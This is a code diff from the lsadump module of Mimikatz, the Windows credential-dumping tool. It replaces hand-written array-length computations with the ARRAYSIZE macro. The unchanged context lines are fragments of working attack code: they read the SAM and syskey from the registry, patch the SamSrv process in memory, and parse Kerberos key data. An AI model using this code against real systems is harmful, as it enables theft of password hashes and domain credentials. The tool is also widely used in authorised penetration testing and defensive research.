@@ -14,7 +14,7 @@ const KUHL_M_C kuhl_m_c_lsadump[] = {
 
 const KUHL_M kuhl_m_lsadump = {
 	L"lsadump", L"LsaDump module", NULL,
-	sizeof(kuhl_m_c_lsadump) / sizeof(KUHL_M_C), kuhl_m_c_lsadump, NULL, NULL
+	ARRAYSIZE(kuhl_m_c_lsadump), kuhl_m_c_lsadump, NULL, NULL
 };
 
 NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
@@ -156,7 +156,7 @@ BOOL kuhl_m_lsadump_getCurrentControlSet(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY
 
 	if(kull_m_registry_RegOpenKeyEx(hRegistry, hSystemBase, L"Select", 0, KEY_READ, &hSelect))
 	{
-		for(i = 0; !status && (i < sizeof(kuhl_m_lsadump_CONTROLSET_SOURCES) / sizeof(wchar_t *)); i++)
+		for(i = 0; !status && (i < ARRAYSIZE(kuhl_m_lsadump_CONTROLSET_SOURCES)); i++)
 		{
 			szNeeded = sizeof(DWORD); 
 			status = kull_m_registry_RegQueryValueEx(hRegistry, hSelect, kuhl_m_lsadump_CONTROLSET_SOURCES[i], NULL, NULL, (LPBYTE) &controlSet, &szNeeded);
@@ -184,7 +184,7 @@ BOOL kuhl_m_lsadump_getSyskey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hLSA, LPBY
 	DWORD szBuffer;
 	BYTE buffKey[SYSKEY_LENGTH];
 
-	for(i = 0 ; (i < sizeof(kuhl_m_lsadump_SYSKEY_NAMES) / sizeof(wchar_t *)) && status; i++)
+	for(i = 0 ; (i < ARRAYSIZE(kuhl_m_lsadump_SYSKEY_NAMES)) && status; i++)
 	{
 		status = FALSE;
 		if(kull_m_registry_RegOpenKeyEx(hRegistry, hLSA, kuhl_m_lsadump_SYSKEY_NAMES[i], 0, KEY_READ, &hKey))
@@ -845,7 +845,7 @@ void kuhl_m_lsadump_hmac_md5(LPCVOID key, DWORD szKey, LPCVOID data, DWORD szDat
 	if(szKey > 64) szKey = 64;
 	RtlCopyMemory(k_ipad, key, szKey);
 	RtlCopyMemory(k_opad, key, szKey);
-	for (i = 0; i < (sizeof(k_ipad) / sizeof(DWORD)); i++)
+	for (i = 0; i < ARRAYSIZE(k_ipad); i++)
 	{
 		k_ipad[i] ^= '6666';
 		k_opad[i] ^= '\\\\\\\\';
@@ -923,11 +923,11 @@ NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
 		{szKernel32,"LocalFree",						(PVOID) 0x4b4b4b4b4b4b4b4b, NULL},
 		{szNtDll,	"memcpy",							(PVOID) 0x4c4c4c4c4c4c4c4c, NULL},
 	};
-	MULTIPLE_REMOTE_EXT extForCb = {sizeof(extensions) / sizeof(REMOTE_EXT), extensions};
+	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
 	
 	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
 	{
-		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, sizeof(SamSrvReferences) / sizeof(KULL_M_PATCH_GENERIC), MIMIKATZ_NT_BUILD_NUMBER))
+		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, ARRAYSIZE(SamSrvReferences), MIMIKATZ_NT_BUILD_NUMBER))
 		{
 			aPatternMemory.address = currentSamSrvReference->Search.Pattern;
 			aPatchMemory.address = currentSamSrvReference->Patch.Pattern;
@@ -1114,7 +1114,7 @@ void kuhl_m_lsadump_lsa_DescrBuffer(DWORD type, PVOID Buffer, DWORD BufferSize)
 	PKERB_KEY_DATA_NEW pKeyDataNew;
 	PSAMPR_USER_INTERNAL1_INFORMATION pUserInfos;
 	
-	kprintf(L"\n * %s\n", (type < sizeof(KUHL_M_LSADUMP_SAMRPC_SUPPCRED_TYPE) / sizeof(PCWCHAR)) ? KUHL_M_LSADUMP_SAMRPC_SUPPCRED_TYPE[type] : L"unknown");
+	kprintf(L"\n * %s\n", (type < ARRAYSIZE(KUHL_M_LSADUMP_SAMRPC_SUPPCRED_TYPE)) ? KUHL_M_LSADUMP_SAMRPC_SUPPCRED_TYPE[type] : L"unknown");
 	switch(type)
 	{
 	case 0:
